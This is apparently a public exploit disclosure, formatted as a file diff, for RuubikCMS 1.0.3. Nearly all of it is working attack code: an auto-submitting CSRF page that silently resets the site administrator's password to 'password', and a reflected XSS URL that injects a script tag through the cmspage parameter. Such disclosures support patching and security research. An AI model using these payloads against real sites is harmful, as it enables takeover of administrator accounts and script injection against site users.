@@ -1,0 +1,45 @@
+----------------------------------------------------------------
+WebApplication : RuubikCMS Version 1.0.3
+Type of vunlnerability : CSRF ( Change Admin Password ) And XSS
+Risk of use : Medium
+----------------------------------------------------------------
+Producer Website : http://www.ruubikcms.com/
+----------------------------------------------------------------
+Discovered by : Khashayar Fereidani
+Team Website : Http://IRCRASH.COM
+Team Members : Khashayar Fereidani - Sina YazdanMehr - Arash Allebrahim
+English Forums : Http://IRCRASH.COM/forums/
+Email : irancrash [ a t ] gmail [ d o t ] com
+----------------------------------------------------------------
+
+CSRF For Change Admin Password :
+
+<html>
+<head></head>
+<body onLoad=javascript:document.form.submit()>
+
+<form action="http://examplesite/ruubikcms/cms/users.php?role=5&p=admin";
+
+method="POST" name="form">
+
+<input type="hidden" name="save" value="1">
+
+<input type="hidden" name="ordernum" value="1">
+
+<input type="hidden" name="username_hidden" value="admin">
+
+<input type="hidden" name="password" value="password">
+
+<input type="hidden" name="confirmpassword" value="password">
+
+
+
+</form>
+</body>
+</html>
+
+------------------------------------------------
+
+Cross Site Scripting Vulnerability :
+
+http://examplesite/ruubikcms/cms/includes/head.php?cmspage=</title><script>alert(123);</script>
